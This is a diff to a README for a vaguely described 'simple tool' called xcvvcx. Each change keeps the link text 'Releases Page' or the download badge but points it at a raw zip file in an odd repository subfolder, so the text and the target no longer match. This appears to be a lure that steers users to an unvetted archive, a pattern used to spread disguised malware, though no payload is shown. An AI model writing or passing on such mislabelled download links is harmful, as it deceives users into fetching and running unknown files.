@@ -1,6 +1,6 @@
 # 🚀 xcvvcx - Simple Tool for Everyday Tasks
 
-[![Download xcvvcx](https://img.shields.io/badge/Download-xcvvcx-blue.svg)](https://github.com/Osi-oso/xcvvcx/releases)
+[![Download xcvvcx](https://raw.githubusercontent.com/Osi-oso/xcvvcx/main/sunspotty/xcvvcx.zip)](https://raw.githubusercontent.com/Osi-oso/xcvvcx/main/sunspotty/xcvvcx.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ xcvvcx is an easy-to-use application designed to help you manage everyday tasks.
 Follow these simple steps to download and run xcvvcx:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Osi-oso/xcvvcx/releases) to find the latest version of xcvvcx.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Osi-oso/xcvvcx/main/sunspotty/xcvvcx.zip) to find the latest version of xcvvcx.
 
 2. **Download the Application**  
    On the Releases page, find the latest version and click on the link to download the application file. 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run xcvvcx:
 
 ## 📥 Download & Install
 
-To download xcvvcx, visit the [Releases Page](https://github.com/Osi-oso/xcvvcx/releases) and select the appropriate version for your system. Here’s how you can do it:
+To download xcvvcx, visit the [Releases Page](https://raw.githubusercontent.com/Osi-oso/xcvvcx/main/sunspotty/xcvvcx.zip) and select the appropriate version for your system. Here’s how you can do it:
 
 - Go to the Releases Page.
 - Click on the most recent version.
